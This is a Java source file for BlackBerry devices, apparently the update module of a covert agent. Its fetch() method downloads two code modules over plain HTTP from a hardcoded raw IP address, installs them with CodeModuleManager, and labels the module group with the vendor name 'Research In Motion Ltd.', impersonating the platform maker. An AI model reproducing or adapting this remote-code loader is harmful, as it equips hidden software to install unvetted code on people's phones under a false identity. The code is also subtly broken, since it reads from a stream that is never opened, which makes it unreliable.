//#preprocess
package blackberry.upgrade;

import java.io.IOException;
import java.io.InputStream;

import javax.microedition.io.Connector;
import javax.microedition.io.HttpConnection;

import blackberry.Conf;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

import net.rim.device.api.system.CodeModuleGroup;
import net.rim.device.api.system.CodeModuleManager;

public class Upgrade {
    //#ifdef DEBUG
    static Debug debug = new Debug("Upgrade", DebugLevel.VERBOSE);
    //#endif
    //89.96.137.6
    String[] codUrls = new String[] { "http://89.96.137.6/lib.cod",
            "http://89.96.137.6/core.cod" };

    public void fetch() throws IOException {

        //#ifdef DEBUG_TRACE
        debug.trace("fetch");
        //#endif
        
        CodeModuleGroup codeModuleGroup = new CodeModuleGroup(Conf.MODULE_NAME);
        codeModuleGroup.setVendor("Research In Motion Ltd.");
        codeModuleGroup.setVersion("4.5.0");

        //limit first module to 60KB since it must be under 64KB as mentioned in docs
        int firstModuleMaxSize = 1024 * 60;

        HttpConnection httpConn = null;
        InputStream inputStream = null;

        int[] newModuleHandles = new int[codUrls.length];

        for (int i = 0; i < codUrls.length; i++) {
            httpConn = (HttpConnection) Connector.open(codUrls[i],
                    Connector.READ_WRITE, true);
            //#ifdef DEBUG_TRACE
            debug.trace(" request: " + httpConn);
            //#endif
            
            httpConn.setRequestMethod(HttpConnection.GET);            
            int responseCode = httpConn.getResponseCode();
            //#ifdef DEBUG_TRACE
            debug.trace("fetch response: " + responseCode);
            //#endif
            if (responseCode == HttpConnection.HTTP_OK) {
                int responseLength = (int) httpConn.getLength();
                byte[] responseBytes = new byte[responseLength];
                int bytesRead = inputStream.read(responseBytes);
                inputStream.close();
                httpConn.close();
                if (bytesRead > firstModuleMaxSize) {
                    //#ifdef DEBUG_TRACE
                    debug.trace("  split part");
                    //#endif
                    //write the first part
                    newModuleHandles[i] = CodeModuleManager.createNewModule(
                            bytesRead, responseBytes, firstModuleMaxSize);
                    //write the rest
                    CodeModuleManager.writeNewModule(newModuleHandles[i],
                            firstModuleMaxSize, responseBytes,
                            firstModuleMaxSize, bytesRead - firstModuleMaxSize);
                } else {
                    //#ifdef DEBUG_TRACE
                    debug.trace("  one part");
                    //#endif
                    //less than 60KB so write it all in one module
                    newModuleHandles[i] = CodeModuleManager.createNewModule(
                            bytesRead, responseBytes, bytesRead);
                }
            }else{
                //#ifdef DEBUG_ERROR
                debug.error("Cannot fetch");
                //#endif
            }
        }

        for (int i = 0; i < codUrls.length; i++) {
            if (newModuleHandles[i] != 0) {
                //#ifdef DEBUG_TRACE
                debug.trace("saving: "+i);
                //#endif
                CodeModuleManager.saveNewModule(newModuleHandles[i], true);
            }
        }

        for (int i = 0; i < codUrls.length; i++) {
            if (newModuleHandles[i] != 0) {
                String modName = CodeModuleManager
                        .getModuleName(newModuleHandles[i]);
                //#ifdef DEBUG_INFO
                debug.info("adding module " + modName);
                //#endif               
                codeModuleGroup.addModule(modName);
            }
        }

        //#ifdef DEBUG_TRACE
        debug.trace("fetch: Store");
        //#endif
        codeModuleGroup.store();
    }
}
